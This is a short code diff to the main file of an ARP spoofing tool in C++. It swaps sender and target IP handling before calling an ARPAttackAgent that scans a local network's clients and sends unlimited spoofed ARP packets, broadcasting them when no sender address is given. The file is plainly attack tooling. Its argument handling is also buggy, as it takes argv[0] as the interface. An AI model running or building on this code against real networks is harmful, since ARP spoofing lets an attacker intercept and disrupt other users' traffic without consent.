@@ -1,27 +1,25 @@
 #include <iostream>
-#include <optional>
-#include "network/NetworkHeader.h"
 #include "network/NetTools.cpp"
 #include "network/ARPAttackAgent.cpp"
 
 
 int main(int argc, char* argv[]) {
     if (argc < 1) {
-        std::cout << "Failed load network protocol..." << std::endl;
+        std::cout << "WARNING: Failed load network protocol..." << std::endl;
         return 1;
     }
 
     char* netInterface = argv[0];
-    std::optional<uint8_t*> senderIP = NetTools::strToIP(argv[1]);
+    auto senderIP = NetTools::strToIP(argv[1]);
     auto targetIp = NetTools::strToIP(argv[2]);
-    if (!senderIP) {
-        std::cout << "INFO: Target-ip setting-up as my-ip" << std::endl;
-        senderIP = NetTools::findMyIP();
-    } else senderIP = nullptr;
-    if (!targetIp) std::cout << "WARNING: Broadcast ARP spoofing attack...." << std::endl;
 
-    auto arpAttackAgent = ARPAttackAgent(netInterface, senderIP.value(), targetIp);
+    if (!targetIp) {
+        std::cout << "INFO: Target-ip setting-up as my-ip...." << std::endl;
+        targetIp = NetTools::findMyIP();
+    }
+    if (!senderIP) std::cout << "WARNING: Broadcast ARP spoofing attack...." << std::endl;
+
+    auto arpAttackAgent = ARPAttackAgent(netInterface, targetIp.value(), senderIP);
     arpAttackAgent.scanClients();
-
     arpAttackAgent.sendARPAttack(ARPAttackAgent::UNLIMITED);
 }
